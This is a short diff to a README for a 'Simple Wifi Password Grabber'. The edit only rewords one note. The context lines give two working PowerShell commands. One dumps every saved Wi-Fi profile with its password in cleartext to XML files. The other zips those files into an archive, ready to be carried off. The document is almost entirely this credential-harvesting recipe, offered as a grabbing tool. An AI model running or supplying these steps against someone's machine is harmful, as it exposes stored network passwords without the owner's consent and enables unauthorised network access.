@@ -1,7 +1,7 @@
 # Simple Wifi Password Grabber #
 #### ↓ PowerShell command to get all saved passwords in system ↓ ####
 `netsh wlan export profile key=clear` 
-_**note:**  this exports all wifi networks into `C:\Users\<user>`) directory in .xml format._
+_**note:**  this will export all wifi networks into `C:\Users\<user>`) directory in .xml format._
 
 #### ↓ PowerShell command to zip all the XML files ↓ ####
 `Compress-Archive -U .\*.xml -DestinationPath temp.zip`
